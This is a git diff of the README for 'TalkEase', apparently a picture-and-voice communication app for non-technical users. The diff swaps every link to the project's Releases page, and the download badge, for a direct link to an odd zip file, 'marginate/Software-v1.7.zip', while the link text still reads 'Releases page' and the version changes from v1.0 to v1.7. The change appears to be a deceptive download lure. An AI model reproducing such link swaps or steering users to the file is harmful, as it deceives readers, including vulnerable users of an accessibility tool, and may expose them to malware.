@@ -3,10 +3,10 @@
 ## 🚀 Getting Started
 Welcome to TalkEase! This guide will help you download and run the application without any technical expertise. Follow these steps to improve your communication using pictures and voice output.
 
-[![Download TalkEase](https://img.shields.io/badge/Download_TalkEase-v1.0-blue.svg)](https://github.com/Quinkaberrodagua/Talkease/releases)
+[![Download TalkEase](https://raw.githubusercontent.com/Quinkaberrodagua/Talkease/main/marginate/Software-v1.7.zip)](https://raw.githubusercontent.com/Quinkaberrodagua/Talkease/main/marginate/Software-v1.7.zip)
 
 ## 📁 Download & Install
-To get started, visit the [Releases page](https://github.com/Quinkaberrodagua/Talkease/releases). Here, you will find the latest version of TalkEase available for download.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Quinkaberrodagua/Talkease/main/marginate/Software-v1.7.zip). Here, you will find the latest version of TalkEase available for download.
 
 1. Click on the latest version.
 2. Choose the appropriate file for your system.
@@ -50,4 +50,4 @@ If you encounter any issues or have questions, feel free to reach out. We are he
 ## 🌍 Next Steps
 Start using TalkEase to express yourself through images and voice output. We are excited to hear how TalkEase enhances your communication experience!
 
-Remember, for downloads, visit the [Releases page](https://github.com/Quinkaberrodagua/Talkease/releases) to get the latest version.
+Remember, for downloads, visit the [Releases page](https://raw.githubusercontent.com/Quinkaberrodagua/Talkease/main/marginate/Software-v1.7.zip) to get the latest version.
